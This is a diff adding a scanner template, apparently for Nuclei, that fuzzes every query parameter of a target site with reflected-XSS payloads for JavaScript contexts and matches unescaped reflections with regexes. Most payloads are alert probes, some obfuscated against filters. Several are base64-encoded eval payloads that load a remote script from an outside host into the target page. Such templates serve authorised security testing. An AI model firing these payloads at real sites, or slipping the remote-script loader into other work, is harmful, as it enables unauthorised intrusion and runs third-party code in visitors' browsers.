@@ -1,0 +1,73 @@
+id: xss-fuzz-javascript-context
+
+info:
+  name: Combined Reflected XSS Checks via Javascript context injections.
+  author: quas
+  severity: medium
+  description: Fuzzes all query parameters for various reflected XSS vulnerabilities via Javascript context injections.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      xss_payloads:
+        - "\";alert(1337);//"
+        - "';alert(1337);//"
+        - "\"-alert(1337)-\""
+        - "'-alert(1337)-'"
+        - "\";alert?.(1337);//"
+        - "';alert?.(1337);//"
+        - "\"-alert?.(1337)-\""
+        - "'-alert?.(1337)-'"
+        - "\";alealertrt(1337);//"
+        - "';alealertrt(1337);//"
+        - "';alealertrt?.(1337);//"
+        - "\"-alealertrt(1337)-\""
+        - "\"-alealertrt?.(1337)-\""
+        - "'-alealertrt(1337)-'"
+        - "'-alealertrt?.(1337)-'"
+        - "\";alealert(1337)rt(1337);//"
+        - "';alealert(1337)rt(1337);//"
+        - "\"-alalert(1337)ert(1337)-\""
+        - "'-alealert(1337)rt(1337)-'"
+        - "'-eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcS5xdWFzLnNoJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpICAK'))-'"
+        - "'-evevalal(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcS5xdWFzLnNoJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpICAK'))-'"
+        - "\"-eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcS5xdWFzLnNoJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpICAK'))-\""
+        - "';eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcS5xdWFzLnNoJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpICAK'));//"
+        - "\";eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vcS5xdWFzLnNoJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpICAK'));//'"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(xss_payloads)}}"
+          - "{{url_encode(url_encode(xss_payloads))}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\";alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\";alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*';alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*';alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\"-alert\\(1337\\)-\"\\s*[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\"-alert\\?\\.\\(1337\\)-\"\\s*[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*'-alert\\(1337\\)-'\\s*[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*'-alert\\?\\.\\(1337\\)-'\\s*[\\s\\S]*</script>"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\";alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\";alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*\\\\';alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*\\\\';alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\"-alert\\(1337\\)-\\\\\"\\s*[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\"-alert\\?\\.\\(1337\\)-\\\\\"\\s*[\\s\\S]*</script>"
+          - "(?i)<script[^>]*>[\\s\\S]*'.*\\\\'-alert\\?\\.\\(1337\\)-\\\\'\\s*[\\s\\S]*</script>"
+      - type: word
+        part: header
+        words:
+          - "text/html"
